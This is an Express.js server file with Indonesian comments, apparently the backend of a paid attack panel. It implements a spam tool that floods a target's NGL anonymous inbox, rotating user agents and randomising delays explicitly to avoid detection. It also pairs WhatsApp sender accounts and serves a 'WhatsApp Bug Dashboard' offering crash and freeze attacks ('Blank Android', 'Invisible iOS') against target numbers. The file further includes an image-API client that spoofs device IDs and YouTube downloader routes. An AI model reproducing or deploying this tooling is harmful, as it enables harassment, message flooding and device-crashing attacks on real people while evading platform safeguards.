    formData.append('referrer', '');
    formData.append('timestamp', Date.now().toString());

    // Random delay yang lebih realistis
    if (attempt > 1) {
      const randomDelay = Math.floor(Math.random() * 4000) + 2000; // 2-6 detik
      await new Promise(resolve => setTimeout(resolve, randomDelay));
    }

    // Enhanced user agents
    const userAgents = [
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
      'Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1'
    ];
    
    const randomUserAgent = userAgents[Math.floor(Math.random() * userAgents.length)];

    try {
      console.log(`🔍 Attempt ${attempt} to ${target}`);
      
      const response = await axios.post('https://ngl.link/api/submit', formData, {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'User-Agent': randomUserAgent,
          'Accept': '*/*',
          'Accept-Language': 'en-US,en;q=0.9',
          'Origin': 'https://ngl.link',
          'Referer': `https://ngl.link/${target}`,
          'X-Requested-With': 'XMLHttpRequest',
          'Sec-Fetch-Dest': 'empty',
          'Sec-Fetch-Mode': 'cors',
          'Sec-Fetch-Site': 'same-origin'
        },
        timeout: 15000,
        validateStatus: function (status) {
          return status >= 200 && status < 500; // Terima semua status kecuali server errors
        }
      });

      console.log(`🔍 Response status: ${response.status}, data:`, response.data);

      // Enhanced response handling
      if (response.status === 200) {
        if (response.data && response.data.success !== false) {
          success++;
          logs.push(`[${attempt}/${count}] ✅ Berhasil dikirim ke ${target}`);
          return true;
        } else {
          errors++;
          logs.push(`[${attempt}/${count}] ⚠️ Response tidak valid: ${JSON.stringify(response.data)}`);
          return false;
        }
      } else if (response.status === 429) {
        errors++;
        logs.push(`[${attempt}/${count}] 🚫 Rate limited - tunggu beberapa saat`);
        // Tunggu lebih lama jika rate limited
        await new Promise(resolve => setTimeout(resolve, 10000));
        return false;
      } else {
        errors++;
        logs.push(`[${attempt}/${count}] ❌ HTTP ${response.status}: ${response.statusText}`);
        return false;
      }
    } catch (error) {
      errors++;
      console.error(`🔍 Error in attempt ${attempt}:`, error.message);
      
      if (error.response) {
        logs.push(`[${attempt}/${count}] ❌ HTTP ${error.response.status}: ${error.response.data?.message || error.response.statusText}`);
      } else if (error.request) {
        logs.push(`[${attempt}/${count}] ❌ Network Error: Tidak dapat terhubung ke server NGL`);
      } else {
        logs.push(`[${attempt}/${count}] ❌ Error: ${error.message}`);
      }
      
      return false;
    }
  };

  // Enhanced UUID generator
  function generateEnhancedUUID() {
    const timestamp = Date.now().toString(36);
    const random = Math.random().toString(36).substr(2, 9);
    return `web-${timestamp}-${random}`;
  }

  // Validasi input
  if (!target || !message || count <= 0) {
    throw new Error('Input tidak valid');
  }

  if (count > 50) { // Kurangi limit untuk menghindari detection
    throw new Error('Maksimal 50 pesan per request untuk menghindari detection');
  }

  // Jalankan spam
  logs.push(`🚀 Memulai spam ke: ${target}`);
  logs.push(`📝 Pesan: ${message}`);
  logs.push(`🔢 Jumlah: ${count} pesan`);
  logs.push(`⏳ Delay: 2-6 detik random antar pesan`);
  logs.push(`─`.repeat(40));

  for (let i = 0; i < count; i++) {
    const result = await sendNGLMessage(target, message, i + 1);
    
    // Jika rate limited, berhenti sementara
    if (i > 0 && i % 10 === 0) {
      logs.push(`⏸️  Istirahat sebentar setelah ${i} pesan...`);
      await new Promise(resolve => setTimeout(resolve, 10000));
    }
  }

  logs.push(`─`.repeat(40));
  logs.push(`📊 SELESAI! Sukses: ${success}, Gagal: ${errors}`);

  return { success, errors, logs };
}

// Helper function untuk generate UUID
function generateUUID() {
  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
    const r = Math.random() * 16 | 0;
    const v = c === 'x' ? r : (r & 0x3 | 0x8);
    return v.toString(16);
  });
}

// ============================================
// ROUTE NGL SPAM WEB - UPDATED dengan Info Limit
// ============================================

// ==================== NGL SPAM ROUTE ==================== //
app.get("/ngl-spam", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  
  const formattedExp = currentUser ? new Date(currentUser.expired).toLocaleString("id-ID", {
    timeZone: "Asia/Jakarta"
  }) : "-";

  const userId = req.ip || req.headers['x-forwarded-for'] || username;
  const userUsageToday = userTracking.getUserStats(userId);
  const remainingUser = 200 - userUsageToday;
  const usagePercentage = (userUsageToday / 200) * 100;

  // Load template dari file terpisah
  const filePath = path.join(__dirname, "INDICTIVE", "spam-ngl.html");
  
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) {
      console.error("❌ Gagal membaca file spam-ngl.html:", err);
      return res.status(500).send("File tidak ditemukan");
    }

    // Replace variables dengan data REAL dari sistem
    let finalHtml = html
      .replace(/\${username}/g, username)
      .replace(/\${formattedExp}/g, formattedExp)
      .replace(/\${userUsageToday}/g, userUsageToday)
      .replace(/\${remainingUser}/g, remainingUser)
      .replace(/\${usagePercentage}/g, usagePercentage);
    
    res.send(finalHtml);
  });
});

// ============================================
// API ENDPOINT - UPDATED dengan Tracking System
// ============================================
app.get("/api/ngl-stats", requireAuth, (req, res) => {
  const userId = req.ip || req.headers['x-forwarded-for'] || req.cookies.sessionUser || 'anonymous';
  
  res.json({
    userStats: {
      todayUsage: userTracking.getUserStats(userId),
      dailyLimit: 200,
      remaining: 200 - userTracking.getUserStats(userId)
    },
    resetTime: 'Midnight (00:00 WIB)',
    message: 'Statistik penggunaan hari ini'
  });
});

// ✨ BONUS: Endpoint untuk cek target
app.get("/api/ngl-target-stats/:target", requireAuth, (req, res) => {
  const { target } = req.params;
  
  res.json({
    target: target,
    todayReceived: userTracking.getTargetStats(target),
    dailyLimit: 100,
    remaining: 100 - userTracking.getTargetStats(target),
    resetTime: 'Midnight (00:00 WIB)'
  });
});

app.post("/api/ngl-spam-js", requireAuth, async (req, res) => {
  const { target, message, count } = req.body;
  
  // Ambil user ID dari IP atau cookie
  const userId = req.ip || req.headers['x-forwarded-for'] || req.cookies.sessionUser || 'anonymous';
  
  // Hard limits
  const limits = {
    maxPerRequest: 100,      // Max 100 pesan per request
    minDelay: 3000,          // Minimal delay 3 detik
    maxDailyPerUser: 200,    // Max 200 pesan per user per hari
    maxDailyPerTarget: 100   // Max 100 pesan ke target yang sama
  };
  
  if (!target || !message || !count) {
    return res.status(400).json({ error: "Semua field harus diisi" });
  }

  // ✅ VALIDASI 1: Cek count tidak melebihi maxPerRequest
  if (count > limits.maxPerRequest) {
    return res.status(400).json({
      error: `❌ Untuk keamanan, maksimal ${limits.maxPerRequest} pesan per request`,
      currentCount: count,
      maxAllowed: limits.maxPerRequest
    });
  }

  if (count < 1) {
    return res.status(400).json({
      error: '❌ Jumlah pesan harus minimal 1'
    });
  }

  // ✅ VALIDASI 2: Cek limit harian user
  const userTotal = userTracking.canUserSend(userId, count);
  if (userTotal > limits.maxDailyPerUser) {
    const currentUsage = userTracking.getUserStats(userId);
    return res.status(429).json({
      error: '🚫 Limit harian tercapai!',
      message: `Kamu sudah kirim ${currentUsage} pesan hari ini. Limit: ${limits.maxDailyPerUser}/hari`,
      currentUsage: currentUsage,
      dailyLimit: limits.maxDailyPerUser,
      remaining: limits.maxDailyPerUser - currentUsage,
      resetTime: 'Midnight (00:00 WIB)'
    });
  }

  // ✅ VALIDASI 3: Cek limit harian target
  const targetTotal = userTracking.canTargetReceive(target, count);
  if (targetTotal > limits.maxDailyPerTarget) {
    const currentTargetUsage = userTracking.getTargetStats(target);
    return res.status(429).json({
      error: '🚫 Target sudah menerima terlalu banyak pesan!',
      message: `Target ${target} sudah terima ${currentTargetUsage} pesan hari ini. Limit: ${limits.maxDailyPerTarget}/hari`,
      currentTargetUsage: currentTargetUsage,
      targetDailyLimit: limits.maxDailyPerTarget,
      remaining: limits.maxDailyPerTarget - currentTargetUsage,
      resetTime: 'Midnight (00:00 WIB)'
    });
  }

  try {
    // Kirim pesan
    const result = await nglSpam(target, message, parseInt(count));
    
    // ✅ UPDATE TRACKING setelah berhasil
    userTracking.updateUser(userId, result.success);
    userTracking.updateTarget(target, result.success);
    
    // Kirim response dengan statistik
    res.json({
      ...result,
      stats: {
        userToday: userTracking.getUserStats(userId),
        userLimit: limits.maxDailyPerUser,
        targetToday: userTracking.getTargetStats(target),
        targetLimit: limits.maxDailyPerTarget,
        remaining: {
          user: limits.maxDailyPerUser - userTracking.getUserStats(userId),
          target: limits.maxDailyPerTarget - userTracking.getTargetStats(target)
        }
      }
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// ==================== GRID PLUS AI IMAGE GENERATOR ==================== //
const FormData = require('form-data');

const MIME_MAP = {
  jpg: "image/jpeg",
  jpeg: "image/jpeg", 
  png: "image/png",
  webp: "image/webp",
  gif: "image/gif",
  bmp: "image/bmp"
};

const DL_HEADERS = {
  "User-Agent": "Mozilla/5.0 (Android 15; Mobile; rv:130.0) Gecko/130.0 Firefox/130.0",
  Accept: "image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
  "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
  "Accept-Encoding": "gzip, deflate, br",
  Referer: "https://www.google.com/",
  "Sec-Fetch-Dest": "image",
  "Sec-Fetch-Mode": "no-cors",
  "Sec-Fetch-Site": "cross-site",
  Priority: "u=1, i"
};

class GridPlus {
  constructor() {
    this.ins = axios.create({
      baseURL: "https://api.grid.plus/v1",
      headers: {
        "user-agent": "Mozilla/5.0 (Android 15; Mobile; rv:130.0) Gecko/130.0 Firefox/130.0",
        "X-AppID": "808645",
        "X-Platform": "h5",
        "X-Version": "8.9.7",
        "X-SessionToken": "",
        "X-UniqueID": this.uid(),
        "X-GhostID": this.uid(),
        "X-DeviceID": this.uid(),
        "X-MCC": "id-ID",
        sig: `XX${this.uid() + this.uid()}`
      }
    });
  }

  uid() {
    return crypto.randomUUID().replace(/-/g, "");
  }

  form(dt) {
    const f = new FormData();
    Object.entries(dt ?? {}).forEach(([k, v]) => {
      if (v != null) f.append(k, String(v));
    });
    return f;
  }

  ext(buf) {
    const h = buf.subarray(0, 12).toString("hex");
    return h.startsWith("ffd8ffe") ? "jpg" : h.startsWith("89504e47") ? "png" : h.startsWith("52494646") && h.substring(16, 24) === "57454250" ? "webp" : h.startsWith("47494638") ? "gif" : h.startsWith("424d") ? "bmp" : "png";
  }

  async up(buf, mtd) {
    if (!Buffer.isBuffer(buf)) throw new Error("Data bukan Buffer");
    const e = this.ext(buf);
    const mime = MIME_MAP[e] ?? "image/png";
    try {
      const d = await this.ins.post("/ai/web/nologin/getuploadurl", this.form({
        ext: e,
        method: mtd
      })).then(r => r?.data);
      await axios.put(d.data.upload_url, buf, {
        headers: {
          "content-type": mime
        }
      });
      const imgUrl = d?.data?.img_url;
      return imgUrl;
    } catch (err) {
      throw err;
    }
  }

  async poll({ path, data, sl = () => false }) {
    const start = Date.now(),
      interval = 3e3,
      timeout = 6e4;
    return new Promise((resolve, reject) => {
      const check = async () => {
        if (Date.now() - start > timeout) {
          return reject(new Error("Polling timeout"));
        }
        try {
          const r = await this.ins({
            url: path,
            method: data ? "POST" : "GET",
            ...data ? { data: data } : {}
          });
          const errMsg = r?.data?.errmsg?.trim();
          if (errMsg) {
            return reject(new Error(errMsg));
          }
          if (sl(r.data)) {
            return resolve(r.data);
          }
          setTimeout(check, interval);
        } catch (err) {
          reject(err);
        }
      };
      check();
    });
  }

  async generate({ prompt = "enhance image quality", imageUrl, ...rest }) {
    try {
      let requestData = {
        prompt: prompt,
        ...rest
      };

      if (imageUrl) {
        let buf = imageUrl;
        if (typeof imageUrl === "string") {
          if (imageUrl.startsWith("http")) {
            const res = await axios.get(imageUrl, {
              responseType: "arraybuffer",
              headers: DL_HEADERS,
              timeout: 15e3,
              maxRedirects: 5
            });
            buf = Buffer.from(res.data);
          } else if (imageUrl.startsWith("data:")) {
            const b64 = imageUrl.split(",")[1] || "";
            buf = Buffer.from(b64, "base64");
          } else {
            buf = Buffer.from(imageUrl, "base64");
          }
        }
        if (!Buffer.isBuffer(buf) || buf.length === 0) {
          throw new Error("Gambar tidak valid atau kosong");
        }
        const uploadedUrl = await this.up(buf, "wn_aistyle_nano");
        requestData.url = uploadedUrl;
      }

      const taskRes = await this.ins.post("/ai/nano/upload", this.form(requestData)).then(r => r?.data);
      const taskId = taskRes?.task_id;
      if (!taskId) throw new Error("Task ID tidak ditemukan");
      
      const result = await this.poll({
        path: `/ai/nano/get_result/${taskId}`,
        sl: d => d?.code === 0 && !!d?.image_url
      });
      
      return result;
    } catch (err) {
      throw err;
    }
  }
}

// ==================== RCIMAGE AI ROUTES ==================== //

// Route untuk halaman RcImage AI
app.get("/rcimage-ai", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "INDICTIVE", "rcimage-ai.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

// API endpoint untuk RcImage AI
app.post('/api/rcimage-ai', requireAuth, async (req, res) => {
  const params = req.body;
  
  if (!params.prompt) {
    return res.status(400).json({
      error: "Input 'prompt' wajib diisi."
    });
  }

  try {
    const api = new GridPlus();
    const response = await api.generate(params);
    return res.status(200).json(response);
  } catch (error) {
    console.error('RcImage AI Error:', error);
    res.status(500).json({
      error: error.message || "Internal Server Error"
    });
  }
});

// ==================== YOUTUBE DOWNLOADER ROUTES ==================== //

// Route untuk halaman YouTube Downloader
app.get("/youtube-downloader", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "INDICTIVE", "youtube-downloader.html");
  res.sendFile(filePath);
});

// API endpoint untuk YouTube Search
app.post('/api/youtube/search', requireAuth, async (req, res) => {
  const { query } = req.body;
  
  if (!query) {
    return res.status(400).json({
      error: "Query pencarian wajib diisi."
    });
  }

  try {
    const searchResponse = await axios.get(`https://api.siputzx.my.id/api/s/youtube?query=${encodeURIComponent(query)}`);
    
    if (searchResponse.data && searchResponse.data.data) {
      return res.json({
        success: true,
        results: searchResponse.data.data
      });
    } else {
      return res.status(404).json({
        error: "Tidak ada hasil ditemukan"
      });
    }
  } catch (error) {
    console.error('YouTube Search Error:', error);
    res.status(500).json({
      error: error.message || "Terjadi kesalahan saat mencari video"
    });
  }
});

// API endpoint untuk YouTube Download
app.post('/api/youtube/download', requireAuth, async (req, res) => {
  const { url } = req.body;
  
  if (!url) {
    return res.status(400).json({
      error: "URL video YouTube wajib diisi."
    });
  }

  try {
    const downloadResponse = await axios.get(`https://restapi-v2.simplebot.my.id/download/ytmp3?url=${encodeURIComponent(url)}`);
    
    if (downloadResponse.data && downloadResponse.data.result) {
      return res.json({
        success: true,
        audioUrl: downloadResponse.data.result
      });
    } else {
      return res.status(404).json({
        error: "Gagal mendapatkan URL download"
      });
    }
  } catch (error) {
    console.error('YouTube Download Error:', error);
    res.status(500).json({
      error: error.message || "Terjadi kesalahan saat mendownload audio"
    });
  }
});

// Route untuk TikTok (HANYA bisa diakses setelah login)
app.get("/tiktok", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "INDICTIVE", "tiktok.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

// API untuk mendapatkan daftar sender user
app.get("/api/my-senders", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const userSessions = loadUserSessions();
  const userSenders = userSessions[username] || [];
  
  res.json({ 
    success: true, 
    senders: userSenders,
    total: userSenders.length
  });
});

// SSE endpoint untuk events real-time
app.get("/api/events", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  
  res.writeHead(200, {
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Access-Control-Allow-Origin': '*',
  });

  // Simpan response object untuk user ini
  userEvents.set(username, res);

  // Kirim heartbeat setiap 30 detik
  const heartbeat = setInterval(() => {
    try {
      res.write(': heartbeat\n\n');
    } catch (err) {
      clearInterval(heartbeat);
    }
  }, 30000);

  // Cleanup saat connection close
  req.on('close', () => {
    clearInterval(heartbeat);
    userEvents.delete(username);
  });

  // Kirim event connection established
  res.write(`data: ${JSON.stringify({ type: 'connected', message: 'Event stream connected' })}\n\n`);
});

// API untuk menambah sender baru
app.post("/api/add-sender", requireAuth, async (req, res) => {
  const username = req.cookies.sessionUser;
  const { number } = req.body;
  
  if (!number) {
    return res.json({ success: false, error: "Nomor tidak boleh kosong" });
  }
  
  // Validasi nomor
  const cleanNumber = number.replace(/\D/g, '');
  if (!cleanNumber.startsWith('94')) {
    return res.json({ success: false, error: "Nomor harus diawali dengan 62" });
  }
  
  if (cleanNumber.length < 10) {
    return res.json({ success: false, error: "Nomor terlalu pendek" });
  }
  
  try {
    console.log(`[API] User ${username} adding sender: ${cleanNumber}`);
    const sessionDir = userSessionPath(username, cleanNumber);
    
    // Langsung jalankan koneksi di background
    connectToWhatsAppUser(username, cleanNumber, sessionDir)
      .then((sock) => {
        console.log(`[${username}] ✅ Sender ${cleanNumber} connected successfully`);
        // Simpan socket ke map jika diperlukan
      })
      .catch((error) => {
        console.error(`[${username}] ❌ Failed to connect sender ${cleanNumber}:`, error.message);
      });

    res.json({ 
      success: true, 
      message: "Proses koneksi dimulai! Silakan tunggu notifikasi kode pairing.",
      number: cleanNumber,
      note: "Kode pairing akan muncul di halaman ini dalam beberapa detik..."
    });
    
  } catch (error) {
    console.error(`[API] Error adding sender for ${username}:`, error);
    res.json({ 
      success: false, 
      error: "Terjadi error saat memproses sender: " + error.message 
    });
  }
});

// API untuk menghapus sender
app.post("/api/delete-sender", requireAuth, async (req, res) => {
  const username = req.cookies.sessionUser;
  const { number } = req.body;
  
  if (!number) {
    return res.json({ success: false, error: "Nomor tidak boleh kosong" });
  }
  
  try {
    const userSessions = loadUserSessions();
    if (userSessions[username]) {
      userSessions[username] = userSessions[username].filter(n => n !== number);
      saveUserSessions(userSessions);
    }
    
    // Hapus folder session
    const sessionDir = userSessionPath(username, number);
    if (fs.existsSync(sessionDir)) {
      fs.rmSync(sessionDir, { recursive: true, force: true });
    }
    
    res.json({ 
      success: true, 
      message: "Sender berhasil dihapus",
      number: number
    });
  } catch (error) {
    res.json({ 
      success: false, 
      error: error.message 
    });
  }
});

app.get("/logout", (req, res) => {
  res.clearCookie("sessionUser");
  res.redirect("/login");
});

app.listen(PORT, () => {
  console.log(`✓ Server aktif di port ${PORT}`);
});

module.exports = { 
  loadAkses, 
  saveAkses, 
  isOwner, 
  isAuthorized,
  saveUsers,
  getUsers
};


// ==================== HTML EXECUTION ==================== //
const executionPage = (
  status = "🟥 Ready",
  detail = {},
  isForm = true,
  userInfo = {},
  message = "",
  mode = ""
) => {
  const { username, expired } = userInfo;
  const formattedTime = expired
    ? new Date(expired).toLocaleString("id-ID", {
        timeZone: "Asia/Jakarta",
        year: "2-digit",
        month: "2-digit",
        day: "2-digit",
        hour: "2-digit",
        minute: "2-digit",
      })
    : "-";

  // Data bug types untuk carousel
  const bugTypes = [
    {
      id: 'delay',
      icon: '<i class="fas fa-hourglass-half"></i>',
      title: 'Delay 50%',
      description: 'Bug dengan delay 50% - cocok untuk testing ringan',
      badge: 'Low Impact'
    },
    {
      id: 'medium',
      icon: '<i class="fas fa-tachometer-alt-fast"></i>',
      title: 'Delay 100%',
      description: 'Bug dengan delay penuh - impact medium pada target',
      badge: 'Medium Impact'
    },
    {
      id: 'blank-ios',
      icon: '<i class="fab fa-apple"></i>',
      title: 'Iphone Hard',
      description: 'Bug iOS tingkat tinggi - telihat',
      badge: 'PayFlood'
    },
    {
      id: 'blank',
      icon: '<i class="fab fa-android"></i>',
      title: 'Blank Android',
      description: 'Bug untuk Android - mengakibatkan stuck',
      badge: 'Load Blank'
    },
    {
      id: 'fcinvsios',
      icon: '<i class="fas fa-eye-slash"></i>',
      title: 'Invisible iOS',
      description: 'Bug invisible keluar paksa - efek maksimal',
      badge: 'High Impact'
    }
  ];

  return `<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>WhatsApp Bug Dashboard</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --primary-black: #0a0a0a;
            --carbon-dark: #121212;
            --carbon-medium: #1a1a1a;
            --carbon-light: #2a2a2a;
            --accent-purple: #b19cd9;
            --accent-purple-light: #d8c8ff;
            --accent-purple-dark: #8a6bc9;
            --text-primary: #ffffff;
            --text-secondary: #e0e0e0;
        }

        body {
            font-family: 'Rajdhani', sans-serif;
            background: var(--primary-black);
            color: var(--text-primary);
            overflow-x: hidden;
            position: relative;
            -webkit-font-smoothing: antialiased;
        }

        .grid-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: 
                radial-gradient(circle at 20% 30%, rgba(177, 156, 217, 0.08) 0%, transparent 50%),
                radial-gradient(circle at 80% 70%, rgba(216, 200, 255, 0.08) 0%, transparent 50%),
                var(--primary-black);
            z-index: -2;
        }

        /* Header */
        .header {
            position: sticky;
            top: 0;
            width: 100%;
            background: rgba(18, 18, 18, 0.95);
            border-bottom: 1px solid rgba(177, 156, 217, 0.3);
            z-index: 1000;
            transition: all 0.3s ease;
            padding: 12px 0;
            backdrop-filter: blur(10px);
        }

        .nav-container {
            max-width: 100%;
            margin: 0 auto;
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 0 16px;
        }

        .logo {
            display: flex;
            align-items: center;
            text-decoration: none;
        }

        .logo-icon {
            width: 32px;
            height: 32px;
            margin-right: 10px;
            background: linear-gradient(135deg, var(--accent-purple-light), white);
            border-radius: 6px;
            transform: rotate(45deg);
            box-shadow: 0 0 15px rgba(177, 156, 217, 0.4);
        }

        .logo-text {
            font-family: 'Orbitron', monospace;
            font-size: 18px;
            font-weight: 900;
            background: linear-gradient(45deg, white, var(--accent-purple-light));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .nav-menu {
            display: flex;
            list-style: none;
            gap: 20px;
            align-items: center;
        }

        .nav-menu a {
            color: var(--text-secondary);
            text-decoration: none;
            padding: 8px 16px;
            transition: all 0.3s ease;
            position: relative;
            text-transform: uppercase;
            font-weight: 500;
            font-size: 12px;
            font-family: 'Orbitron', monospace;
        }

        .nav-menu a::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 0;
            height: 2px;
            background: linear-gradient(90deg, white, var(--accent-purple-light));
            transition: width 0.3s ease;
        }

        .nav-menu a:hover::after,
        .nav-menu a.active::after {
            width: 100%;
        }

        .nav-menu a:hover,
        .nav-menu a.active {
            color: white;
        }

        .menu-toggle {
            display: none;
            flex-direction: column;
            cursor: pointer;
            padding: 5px;
        }

        .menu-toggle span {
            width: 25px;
            height: 3px;
            background: white;
            margin: 3px 0;
            transition: 0.3s;
            border-radius: 2px;
        }

        /* Hero Section */
        .hero {
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 100px 16px 60px;
        }

        .hero-content {
            text-align: center;
            max-width: 800px;
            margin-bottom: 50px;
        }

        .hero-title {
            font-family: 'Orbitron', monospace;
            font-size: 3rem;
            font-weight: 900;
            background: linear-gradient(45deg, white, var(--accent-purple-light));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-transform: uppercase;
            margin-bottom: 20px;
        }

        .hero-subtitle {
            color: var(--text-secondary);
            font-size: 1.1rem;
            margin-bottom: 30px;
        }

        /* Target Image Section */
        .target-image-section {
            max-width: 600px;
            margin: 0 auto 30px;
            text-align: center;
        }

        .target-image-container {
            position: relative;
            width: 100%;
            max-width: 500px;
            height: 250px;
            margin: 0 auto 20px;
            border-radius: 15px;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(177, 156, 217, 0.3);
            border: 2px solid rgba(177, 156, 217, 0.5);
            transition: all 0.3s ease;
            background: linear-gradient(135deg, #1a1a2e, #16213e, #0f3460);
        }

        .target-image-container:hover {
            transform: translateY(-5px);
            box-shadow: 0 15px 40px rgba(177, 156, 217, 0.5);
            border-color: var(--accent-purple-light);
        }

        .target-image {
            width: 100%;
            height: 100%;
            position: relative;
            overflow: hidden;
        }

        .target-image img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        .target-image-overlay {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(to bottom, rgba(0, 0, 0, 0) 0%, rgba(0, 0, 0, 0.8) 70%);
            display: flex;
            flex-direction: column;
            justify-content: flex-end;
            align-items: center;
            text-align: center;
            padding: 20px;
        }

        .target-text-container {
            position: relative;
            width: 110%;
            overflow: hidden;
        }

        .target-text {
            font-family: 'Orbitron', monospace;
            font-size: 18px;
            color: white;
            text-transform: uppercase;
            letter-spacing: 2px;
            white-space: nowrap;
            animation: marquee 15s linear infinite;
            text-shadow: 0 0 10px rgba(0, 0, 0, 0.7);
            padding: 5px 0;
        }

        @keyframes marquee {
            0% {
                transform: translateX(100%);
            }
            100% {
                transform: translateX(-100%);
            }
        }

        .target-description {
            color: var(--text-secondary);
            font-size: 14px;
            max-width: 500px;
            margin: 15px auto 0;
            line-height: 1.6;
        }

        /* Input Section */
        .input-section {
            max-width: 500px;
            margin: 0 auto 60px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 20px;
            padding: 30px;
            backdrop-filter: blur(10px);
        }

        .input-group {
            margin-bottom: 20px;
        }

        .input-label {
            display: block;
            margin-bottom: 10px;
            color: var(--accent-purple-light);
            font-weight: 600;
            font-size: 14px;
            text-transform: uppercase;
        }

        .input-field {
            width: 100%;
            padding: 14px 16px;
            border-radius: 12px;
            border: 1px solid rgba(255, 255, 255, 0.15);
            background: rgba(255, 255, 255, 0.08);
            color: var(--text-primary);
            font-size: 15px;
            outline: none;
            transition: 0.3s;
            font-family: 'Rajdhani', sans-serif;
        }

        .input-field:focus {
            border-color: var(--accent-purple-light);
            box-shadow: 0 0 15px rgba(177, 156, 217, 0.3);
        }

        /* Carousel Section */
        .carousel-section {
            padding: 60px 16px;
        }

        .section-title {
            font-family: 'Orbitron', monospace;
            font-size: 2.5rem;
            font-weight: 900;
            text-align: center;
            margin-bottom: 20px;
            background: linear-gradient(45deg, white, var(--accent-purple-light));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-transform: uppercase;
        }

        .section-subtitle {
            color: var(--text-secondary);
            font-size: 14px;
            max-width: 600px;
            margin: 0 auto 50px;
            text-align: center;
        }

        .carousel-container {
            width: 100%;
            max-width: 100%;
            height: 500px;
            perspective: 1000px;
            position: relative;
        }

        .carousel {
            width: 100%;
            height: 100%;
            position: relative;
            transform-style: preserve-3d;
        }

        .carousel-item {
            position: absolute;
            width: 300px;
            height: 400px;
            left: 50%;
            top: 50%;
            transform-style: preserve-3d;
            transition: all 0.8s cubic-bezier(0.4, 0.0, 0.2, 1);
            cursor: pointer;
            transform-origin: center center;
        }

        .carousel-item .card {
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 16px;
            padding: 25px;
            position: relative;
            overflow: hidden;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
            backdrop-filter: blur(10px);
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            transition: all 0.3s ease;
        }

        .carousel-item .card:hover {
            transform: translateY(-5px);
            box-shadow: 0 15px 30px rgba(177, 156, 217, 0.2);
        }

        .card-icon {
            width: 80px;
            height: 80px;
            margin: 0 auto 20px;
            border-radius: 50%;
            background: linear-gradient(135deg, var(--accent-purple-light), white);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 40px;
            box-shadow: 0 5px 20px rgba(177, 156, 217, 0.4);
            color: var(--primary-black);
        }

        .card-title {
            font-family: 'Orbitron', monospace;
            font-size: 22px;
            font-weight: 700;
            margin-bottom: 15px;
            text-transform: uppercase;
            color: white;
            text-align: center;
        }

        .card-description {
            color: var(--text-secondary);
            line-height: 1.6;
            margin-bottom: 20px;
            font-size: 14px;
            text-align: center;
            flex-grow: 1;
        }

        .card-badge {
            display: inline-block;
            padding: 6px 15px;
            background: rgba(177, 156, 217, 0.2);
            border: 1px solid var(--accent-purple-light);
            border-radius: 20px;
            font-size: 12px;
            color: var(--accent-purple-light);
            text-transform: uppercase;
            font-weight: 600;
            margin: 0 auto 20px;
        }

        .card-cta {
            padding: 14px 30px;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.9), var(--accent-purple-light));
            border: none;
            border-radius: 25px;
            color: var(--primary-black);
            font-weight: 700;
            text-transform: uppercase;
            cursor: pointer;
            transition: all 0.3s ease;
            font-size: 14px;
            font-family: 'Orbitron', monospace;
        }

        .card-cta:hover {
            transform: translateY(-2px);
